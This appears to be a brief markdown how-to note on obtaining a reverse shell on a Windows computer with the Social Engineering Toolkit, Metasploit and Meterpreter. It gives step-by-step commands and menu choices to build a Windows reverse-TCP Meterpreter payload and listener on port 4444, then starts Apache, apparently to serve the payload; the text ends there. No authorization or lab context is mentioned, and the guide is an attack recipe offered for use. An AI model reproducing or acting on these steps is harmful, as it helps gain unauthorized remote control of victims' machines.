# Obtaining a reverse shell with SET, Metasploit and Meterpreter
﷽
* This is a guide to obtaining a reverse shell on a windows computer.
* Insha Allah, you will have a nice **C:/Windows/System32>** prompt at the end :)
## Guide

* Firstly, find your IP:
  * **Private**: `wimli`
  * **Public**: `wimi`

* Then, navigate to the SET directory and start the SET:
  * `cd social-engineering-toolkit`
  * `sudo setoolkit`

* Après ça, select:
  * 1 (`Social Engineering Attacks`)
  * 4 (`Create a payload and a listener`)
  * 2 (`Windows Reverse_TCP Meterpreter`)
  * Then, enter your IP found in the start of this section.
  * Use a port that isn't assigned to a specific service, ie. `4444` is good.
  * Don't start the listener, instead open a new tab and continue the guide.

* Then, start the apache service:
  * `sudo apachectl start`
  * If you go to the IP in browser, you should see `It works!`
